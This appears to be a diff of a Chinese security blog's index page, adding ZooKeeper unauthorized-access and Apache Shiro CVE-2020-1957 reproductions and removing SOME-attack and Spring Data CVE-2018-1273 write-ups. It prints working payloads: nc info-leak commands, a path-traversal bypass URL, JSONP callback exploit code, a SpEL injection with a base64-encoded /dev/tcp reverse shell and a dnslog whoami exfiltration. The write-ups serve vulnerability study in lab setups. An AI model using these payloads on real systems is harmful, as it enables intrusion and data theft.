@@ -86,6 +86,159 @@
 
     
         <h2 class="title">
+            <a href="/2023/12/06/CVE-2014-085-ZooKeeper/">
+                ZooKeeper 未授权访问漏洞（CVE-2014-085） 复现
+            </a>
+        </h2>
+    
+    <time>
+        Dec 6, 2023
+    </time>
+    <section class="content">
+        <h1><span id="zookeeper-未授权访问漏洞cve-2014-085-复现">ZooKeeper 未授权访问漏洞（CVE-2014-085） 复现</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44108455/article/details/107708133">gclome</a> 并作补充</p>
+<p>最近想收集一下近几年的通用型漏洞，然后就找到了这个漏洞，那就先来这个漏洞吧！</p>
+</blockquote>
+<h2><span id="zookeeper未授权访问漏洞是什么">ZooKeeper未授权访问漏洞是什么</span></h2><blockquote>
+<p>ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。</p>
+<p>ZooKeeper默认开启在2181端口，在未进行任何访问控制情况下，攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境</p>
+</blockquote>
+<h2><span id="漏洞原因">漏洞原因</span></h2><blockquote>
+<p>默认安装配置完的zookeeper允许未授权访问，管理员未配置访问控制列表（ACL）。导致攻击者可以在默认开放的2181端口下通过执行envi命令获得大量敏感信息（系统名称、java环境）导致任意用户可以在网络不受限的情况下进行未授权访问读取数据甚至杀死服务。</p>
+<p>（原因如下：默认的ACL中未进行限制访问）</p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/1.png" alt="image"></p>
+<p>用于访问控制的模式有：<br>（1）world 代表任何用户<br>（2）auth 不使用任何id，代表任何已经认证过的用户<br>（3）digest 使用username:password认证，password使用md5哈希之后base64再编码，现改成了sha1加密。<br>（4）ip 用客户端的ip作为ACL的标识。</p>
+</blockquote>
+<h2><span id="环境搭建">环境搭建</span></h2><blockquote>
+<p>测试机： Kali （192.168.133.134）<br>靶机： Kali（192.168.133.132）<br>版本：zookeeper-3.4.14</p>
+<p>分别在测试机和靶机都安装zookeeper-3.4.14<br>安装命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#搭建环境</span></span><br><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz</span><br><span class="line">tar -xzvf zookeeper-3.4.14.tar.gz </span><br><span class="line"><span class="built_in">cd</span> zookeeper-3.4.14/conf</span><br><span class="line"><span class="built_in">mv</span> zoo_sample.cfg zoo.cfg</span><br><span class="line">../bin/zkServer.sh start <span class="comment"># 启动</span></span><br></pre></td></tr></table></figure>
+
+<p>搭建成功 默认端口是2181</p>
+</blockquote>
+<h2><span id="漏洞证明">漏洞证明</span></h2><blockquote>
+<p>尝试连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./zkCli.sh -server  192.168.133.132 2181</span><br></pre></td></tr></table></figure>
+
+<p>如下图，连接成功</p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/2.png" alt="image"></p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/3.png" alt="image"></p>
+<p>并且存在此漏洞！</p>
+<p>获取该服务器的环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> envi|nc 192.168.133.132 2181</span><br></pre></td></tr></table></figure>
+
+<p>通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。</p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/4.png" alt="image"></p>
+</blockquote>
+<h2><span id="漏洞利用">漏洞利用</span></h2><h3><span id="part1">part1</span></h3><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stat</span>：列出关于性能和连接的客户端的统计信息。</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">stat</span> |nc 192.168.133.132 2181</span><br><span class="line"></span><br><span class="line">ruok：测试服务器是否运行在非错误状态。</span><br><span class="line"><span class="built_in">echo</span> ruok |nc 192.168.133.132 2181</span><br><span class="line"></span><br><span class="line">reqs：列出未完成的请求。</span><br><span class="line"><span class="built_in">echo</span> reqs |nc 192.168.133.132 2181</span><br><span class="line"></span><br><span class="line">envi：打印有关服务环境的详细信息。</span><br><span class="line"><span class="built_in">echo</span> envi |nc 192.168.133.132 2181</span><br><span class="line"></span><br><span class="line">dump：列出未完成的会话和临时节点。</span><br><span class="line"><span class="built_in">echo</span> dump |nc 192.168.133.132 2181</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/5.png" alt="image"></p>
+</blockquote>
+<h3><span id="part2">part2</span></h3><blockquote>
+<p>我们在zk的客户端可以进行节点权限的查看和设置。</p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/6.png" alt="image"></p>
+<p>从上述操作可以看出，zk新创建的znode默认访问方式为world。我们通过addauth和setAcl给&#x2F;test节点设置访问权限为digest，操作权限为cdrwa，用户名为user，密码为password。</p>
+<p>当然，我们使用getAcl是无法获取可访问用户test的明文密码的（要是可以获取明文密码，不又是个漏洞嘛~~）。</p>
+<p>另启zk客户端，执行ls &#x2F;test,发现当前用户已经无法访问&#x2F;test节点，提示信息为“Authentication is not valid”。解决方法就是addauth添加认证用户了，并且必须使用用户名和密码明文进行认证。</p>
+<p>addauth添加digest认证用户user后，即可正常访问&#x2F;test节点了。</p>
+<p>另外，还有一点需要注意，znode的ACL是相互独立的。也就是说，任意不同节点可以用不同的acl列表，互不影响，并且ACL是不可被继承的。</p>
+<p>我们在&#x2F;test下创建leaf节点，可发现，leaf节点的认证方式为world，即任何用户都有访问权限。</p>
+</blockquote>
+<h4><span id="利用zookeeper可视化管理工具进行连接">利用zookeeper可视化管理工具进行连接</span></h4><blockquote>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip">https://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip</a></p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/7.png" alt="image"></p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/8.png" alt="image"></p>
+</blockquote>
+<h2><span id="修复方案">修复方案</span></h2><blockquote>
+<p>禁止把Zookeeper直接暴露在公网</p>
+<p>添加访问控制，根据情况选择对应方式（认证用户，用户名密码，指定IP）</p>
+<p>配置防火墙策略，只允许指定IP访问2181端口</p>
+<p>配置服务ACL限制IP访问</p>
+</blockquote>
+<h2><span id="参考链接">参考链接</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u011721501/article/details/44062617">https://blog.csdn.net/u011721501/article/details/44062617</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0nc3/p/12071281.html">https://www.cnblogs.com/0nc3/p/12071281.html</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6103#toc-7">https://xz.aliyun.com/t/6103#toc-7</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Aaron_Miller/article/details/106049421">https://blog.csdn.net/Aaron_Miller/article/details/106049421</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ilovena/p/9484522.html">https://www.cnblogs.com/ilovena/p/9484522.html</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/ZooKeeper/" rel="tag">ZooKeeper</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/12/06/CVE-2020-1957-Apache-Shiro/">
+                Apache Shiro 认证绕过漏洞 CVE-2020-1957 漏洞复现
+            </a>
+        </h2>
+    
+    <time>
+        Dec 6, 2023
+    </time>
+    <section class="content">
+        <h1><span id="apache-shiro-认证绕过漏洞-cve-2020-1957-漏洞复现">Apache Shiro 认证绕过漏洞 CVE-2020-1957 漏洞复现</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44037296/article/details/119105197">Senimo_</a> 并作补充</p>
+</blockquote>
+<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
+<p>Apache Shiro 是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。<br>CVE-2020-1957，Spring Boot中使用 Apache Shiro 进行身份验证、权限控制时，可以精心构造恶意的URL，利用 Apache Shiro 和 Spring Boot 对URL的处理的差异化，可以绕过 Apache Shiro 对 Spring Boot 中的 Servlet 的权限控制，越权并实现未授权访问。</p>
+</blockquote>
+<h2><span id="漏洞影响">漏洞影响</span></h2><h3><span id="环境搭建">环境搭建</span></h3><blockquote>
+<p>执行如下命令启动一个搭载Spring 2.2.2与Shiro 1.5.1的应用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulhub/shiro/CVE-2020-1957</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+
+
+<p>环境启动后，访问<code>http://x.x.x.x:8080</code>即可查看首页:</p>
+<p><img src="/2023/12/06/CVE-2020-1957-Apache-Shiro/1.png" alt="image"></p>
+<p>这个应用中对URL权限的配置如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> ShiroFilterChainDefinition <span class="title function_">shiroFilterChainDefinition</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">DefaultShiroFilterChainDefinition</span> <span class="variable">chainDefinition</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultShiroFilterChainDefinition</span>();</span><br><span class="line">    chainDefinition.addPathDefinition(<span class="string">&quot;/login.html&quot;</span>, <span class="string">&quot;authc&quot;</span>); <span class="comment">// need to accept POSTs from the login form</span></span><br><span class="line">    chainDefinition.addPathDefinition(<span class="string">&quot;/logout&quot;</span>, <span class="string">&quot;logout&quot;</span>);</span><br><span class="line">    chainDefinition.addPathDefinition(<span class="string">&quot;/admin/**&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> chainDefinition;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="漏洞复现">漏洞复现</span></h3><blockquote>
+<p>使用BurpSuite抓取数据包，访问<code>/admin/</code>目录：</p>
+<p><img src="/2023/12/06/CVE-2020-1957-Apache-Shiro/2.png" alt="image"></p>
+<p>回显<code>302</code>并跳转到登录页面：</p>
+<p><img src="/2023/12/06/CVE-2020-1957-Apache-Shiro/3.png" alt="image"></p>
+<p>构造恶意请求<code>/xxx/..;/admin/</code>，即可绕过权限校验，访问到管理页面：</p>
+<p><img src="/2023/12/06/CVE-2020-1957-Apache-Shiro/4.png" alt="image"></p>
+<p>URL请求过程：</p>
+<ul>
+<li>客户端请求URL: <code>/xxx/..;/admin/</code></li>
+<li>Shrio 内部处理得到校验URL为 <code>/xxxx/..</code>,校验通过</li>
+<li>SpringBoot 处理 <code>/xxx/..;/admin/</code> , 最终请求 <code>/admin/</code>, 成功访问了后台请求。</li>
+</ul>
+</blockquote>
+<h2><span id="漏洞poc">漏洞POC</span></h2><blockquote>
+<p>构造恶意请求<code>/xxx/..;/admin/</code>，即可绕过权限校验，访问到管理页面。</p>
+</blockquote>
+<h2><span id="参考链接">参考链接</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.safedog.cn/news.html?id=4441">https://www.safedog.cn/news.html?id=4441</a><br><a target="_blank" rel="noopener" href="https://blog.spoock.com/2020/05/09/cve-2020-1957/">https://blog.spoock.com/2020/05/09/cve-2020-1957/</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2023/12/06/CVE-2020-13945-Apache-APISIX/">
                 Apache APISIX 默认密钥漏洞（CVE-2020-13945）
             </a>
@@ -673,120 +826,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/10/25/SOME-Attack/">
-                浅析同源方式执行（SOME）攻击
-            </a>
-        </h2>
-    
-    <time>
-        Oct 25, 2023
-    </time>
-    <section class="content">
-        <h1><span id="浅析同源方式执行some攻击">浅析同源方式执行（SOME）攻击</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/169873.html">Str3am</a> 并作补充</p>
-</blockquote>
-<blockquote>
-<p>SOME（Same Origin Method Execution），同源方式执行，不同于 XSS 盗取用户 cookie 为目的，直接劫持 cookie 经行操作，和 CSRF 攻击很类似，不同的是 CSRF 是构造一个请求，而 SOME 则希望脚本代码被执行。  非常感谢兔子师傅@Homaebic在分享会上的分享，才有了这篇文章。</p>
-</blockquote>
-<h2><span id="0x01-原理及危害">0x01 原理及危害</span></h2><blockquote>
-<p>想要理解SOME攻击，必须先对同源策略和JSONP技术有所了解，JSONP我理解为一种用户可控制js执行函数的跨域数据访问技术，详细可以参见这篇文章或者百度。<br><a target="_blank" rel="noopener" href="http://blog.safedog.cn/?p=13">SOME攻击</a><br>正是由于JSONP可以控制执行函数的特性，产生了SOME攻击，主要危害比如点击链接后自动关注微博，自动点赞，自动授权等。</p>
-</blockquote>
-<h2><span id="0x02-攻击条件">0x02 攻击条件</span></h2><blockquote>
-<p>存在用户可控函数点，读取用户输入执行对应javascript代码（即寻找JSONP点，通常以get方法callback名传入）<br>可控点可以输入”.”，点号（因为SOME攻击主要还是操作网页DOM）</p>
-</blockquote>
-<h2><span id="0x03-some复现">0x03 SOME复现</span></h2><blockquote>
-<p>这里通过一个大佬写的SOME靶场来练习复现，除了靶场，还有查找dom工具，exp生成，SOME原理介绍，很不错的一个学习网站。<br><img src="/2023/10/25/SOME-Attack/1.png" alt="image"> </p>
-<p><a target="_blank" rel="noopener" href="https://www.someattack.com/Playground/About">Same Origin Method Execution</a><br>点击第一个 Vulnerable Example 项目，并打开一个子网页，在颜色轮盘上选择任意颜色，发现父网页标签背景会根据选择改变。<br><img src="/2023/10/25/SOME-Attack/2.png" alt="image"> </p>
-<p>子网页其实就是一个JSONP可控点，当我们点击轮盘中的任意颜色后它的连接如下：<br><a target="_blank" rel="noopener" href="https://www.someattack.com/Playground/ColorPicker.php?callback=changeColor">https://www.someattack.com/Playground/ColorPicker.php?callback=changeColor</a><br>现在我们想要做的就是控制callback参数，访问之后自动点击父页面的红色按钮。<br>利用第二个 Reference Generator 项目介绍的谷歌插件，这是一个可以自动获取元素DOM位置的插件。<br><img src="/2023/10/25/SOME-Attack/3.png" alt="image"></p>
-<p>右键即可获取，可在控制台中用click事件测试是否获取正确。<br><img src="/2023/10/25/SOME-Attack/4.png" alt="image"></p>
-<p>修改子页面参数如下：<br><code>https://www.someattack.com/Playground/ColorPicker.php?callback=box.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click</code></p>
-<p>访问之后弹窗，按钮被点击，SOME攻击实现。<br><img src="/2023/10/25/SOME-Attack/5.png" alt="image"></p>
-<p>兔子师傅演示的时候打开了两个网页some1和some2，打开some1后，用windiow。open方式打开some2页面，等some1页面加载完之后，some2地址location.replace到payload实现攻击。<br>我在实际测试的时候发现，当我打开第一个页面，然后直接开启一个新的页面访问payload，第一个页面是不会弹窗的，但是两个页面都是满足同源策略的，按理说执行脚本代码是没问题的，参阅文章后发现，要实现DOM操作，两个界面还必须满足父窗口和子窗口关系，这样子窗口才能够操作到父窗口的DOM，否则执行操作的时候会提示元素找不到的错误。兔子师傅这里是在some1下用window.open打开的some2界面，两个窗口父子关系是满足的。<br>同时，还需要注意一点的是，因为很多浏览器禁止window.open的原因（谷歌和火狐会禁止），兔子师傅的方法局限性很大，柠檬师傅采用了两个iframe的办法，避免了拦截，也很好的保证了同源性。附上柠檬师傅的代码</p>
-</blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;https://www.someattack.com/Playground/&quot;</span> name=b&gt;&lt;/iframe&gt;</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">a</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="variable language_">window</span>.<span class="property">frames</span>[<span class="number">0</span>].<span class="title function_">open</span>(<span class="string">&#x27;https://www.someattack.com/Playground/&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="built_in">setTimeout</span>(</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="variable language_">window</span>.<span class="property">frames</span>[<span class="number">1</span>].<span class="property">location</span>.<span class="property">href</span> = <span class="string">&#x27;https://www.someattack.com/Playground/ColorPicker.php?callback=document.body.firstElementChild.lastElementChild.lastElementChild.lastElementChild.previousSibling.previousSibling.lastElementChild.click&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        ,<span class="number">1000</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
-
-<h2><span id="0x04-漏洞防御">0x04 漏洞防御</span></h2><blockquote>
-<p>回调函数使用静态函数命名，限制该函数的调用范围。<br>谷歌的解决方法是，把回调函数加入服务器端的白名单。<br>Hayak建议，注册回调函数。</p>
-</blockquote>
-<h2><span id="参考链接">参考链接</span></h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.someattack.com/Playground/">https://www.someattack.com/Playground/</a><br><a target="_blank" rel="noopener" href="http://blog.safedog.cn/?p=13">http://blog.safedog.cn/?p=13</a><br><a target="_blank" rel="noopener" href="http://www.aqniu.com/hack-geek/5075.html">http://www.aqniu.com/hack-geek/5075.html</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SOME/" rel="tag">SOME</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/10/25/CVE-2018-1273-Spring-Data/">
-                Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）漏洞验证与getshell
-            </a>
-        </h2>
-    
-    <time>
-        Oct 25, 2023
-    </time>
-    <section class="content">
-        <h1><span id="spring-data-commons-远程命令执行漏洞cve-2018-1273漏洞验证与getshell">Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）漏洞验证与getshell</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45300786/article/details/119323425">樱浅沐冰</a> 并作补充</p>
-</blockquote>
-<h2><span id="影响版本">影响版本</span></h2><blockquote>
-<p>Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)<br>Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)<br>Spring Data Commons 2.0 to 2.0.5 (Kay SR5)<br>Spring Data REST 3.0 - 3.0.5 (Kay SR5)</p>
-</blockquote>
-<h2><span id="复现过程">复现过程</span></h2><blockquote>
-<p>vulhub<br>详细过程请看<a target="_blank" rel="noopener" href="https://blog.csdn.net/zy15667076526/article/details/111413971?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162786362316780269821706%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=162786362316780269821706&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-111413971.pc_v2_rank_blog_default&utm_term=CVE-2018-1273&spm=1018.2226.3001.4450">Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</a></p>
-</blockquote>
-<h3><span id="一-验证">一、验证</span></h3><blockquote>
-<p>这里使用dnslog来验证。<br>先获取一个dns地址<br>t15gcx.dnslog.cn<br><img src="/2023/10/25/CVE-2018-1273-Spring-Data/1.png" alt="image"> </p>
-<p>拼接命令<br><code>curl </code>whoami<code>.t15gcx.dnslog.cn</code></p>
-</blockquote>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">base64编码</a><br>对反弹shell的POC进行base64编码（java反弹shell都需要先编码，不然不会成功，原因貌似是runtime不支持管道符）<br><img src="/2023/10/25/CVE-2018-1273-Spring-Data/2.png" alt="image"> </p>
-<p><code>bash -c &#123;echo,Y3VybCBgd2hvYW1pYC50MTVnY3guZG5zbG9nLmNu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p>
-</blockquote>
-<h3><span id="exp">Exp</span></h3><blockquote>
-<p>替换对应的payload，重新发送数据包<br>成功反弹回显到dnslog上<br><code>username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;bash -c &#123;echo,Y3VybCBgd2hvYW1pYC50MTVnY3guZG5zbG9nLmNu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)]=&amp;password=&amp;repeatedPassword=</code></p>
-<p><img src="/2023/10/25/CVE-2018-1273-Spring-Data/3.png" alt="image"> </p>
-</blockquote>
-<h3><span id="二-反弹shell">二、反弹shell</span></h3><blockquote>
-<p>反弹shell<br><code>bash -i &gt;&amp; /dev/tcp/192.168.100.23/9090 0&gt;&amp;1</code></p>
-</blockquote>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">base64编码</a><br>对反弹shell的POC进行base64编码（java反弹shell都需要先编码，不然不会成功，原因貌似是runtime不支持管道符）<br><code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4yMy85MDkwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code><br>监听9090端口<br><img src="/2023/10/25/CVE-2018-1273-Spring-Data/4.png" alt="image"> </p>
-</blockquote>
-<blockquote>
-<p>替换掉curlwhoami.t15gcx.dnslog.cn对应的payload，重新发送数据包<br>成功反弹shell<br><img src="/2023/10/25/CVE-2018-1273-Spring-Data/5.png" alt="image"> </p>
-</blockquote>
-<h2><span id="参考文章">参考文章</span></h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zy15667076526/article/details/111413971?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162786362316780269821706%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=162786362316780269821706&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-111413971.pc_v2_rank_blog_default&utm_term=CVE-2018-1273&spm=1018.2226.3001.4450">Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</a><br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/spring/CVE-2018-1273">Vulhub CVE-2018-1273</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Spring/" rel="tag">Spring</a>
             </div>
         
 
